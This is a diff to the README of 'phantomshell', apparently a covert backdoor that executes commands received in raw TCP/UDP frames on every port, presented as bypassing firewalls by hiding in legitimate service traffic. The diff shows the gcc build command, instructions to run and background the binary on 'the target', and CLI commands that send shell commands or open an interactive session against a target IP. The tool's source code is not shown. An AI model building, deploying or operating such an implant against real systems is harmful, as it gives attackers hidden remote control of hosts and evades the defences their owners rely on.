@@ -9,13 +9,13 @@
 
 Executes commands via raw TCP/UDP ethernet frames, bypassing external (and local) firewalling by piggybacking on legitimate service traffic. Listens on every port, all in one C file.
 
-## Build & Usage
+## Payload Build & Usage
 
 ```
 gcc -O2 -o phantomshell phantomshell.c
 ```
 
-Then just simply run the binary on the target to start listening. Optionally background it with `./phantomshell &`. Listens on all interfaces, all UDP+TCP ports, and only processes packets destined for its local IP.
+Then just simply run the binary on the target. Optionally background it with `./phantomshell &`. Listens on all interfaces, all UDP+TCP ports, and only processes packets destined for its local IP.
 
 ## CLI
 
@@ -31,7 +31,7 @@ python3 phantomshell-cli.py -t <ip> --tcp -p 80 -c id
 python3 phantomshell-cli.py -t <ip> --tcp -p 80 -i
 ```
 
-UDP (default):
+UDP (default, random port):
 ```
 python3 phantomshell-cli.py -t <ip> -c <cmd>
 python3 phantomshell-cli.py -t <ip> -c <cmd> --nocap
